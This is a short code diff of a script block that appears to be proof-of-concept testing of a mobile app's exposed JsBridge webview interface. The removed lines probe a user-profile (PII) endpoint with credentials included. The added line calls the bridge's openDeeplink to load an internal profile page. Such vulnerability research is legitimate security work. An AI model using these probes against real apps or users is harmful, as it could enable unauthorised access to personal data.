@@ -1,11 +1,4 @@
 <script>
-  // Proves: JS runs, JsBridge exists, PII endpoint is reachable
-  // Blocked only by CORS - same-origin XSS would fully compromise this
-  alert('JsBridge exposed: ' + (typeof window.JsBridge));
-  
-  fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile', {
-    credentials: 'include'
-  })
-  .then(r => alert('PII endpoint reachable, status: ' + r.status))
-  .catch(e => alert('CORS blocked: ' + e));
+  // Calls openDeeplink with an internal screen deep link
+  window.JsBridge.openDeeplink('zomato://webview?url=https://www.zomato.com/webroutes/getPage?page_url=/profile');
 </script>
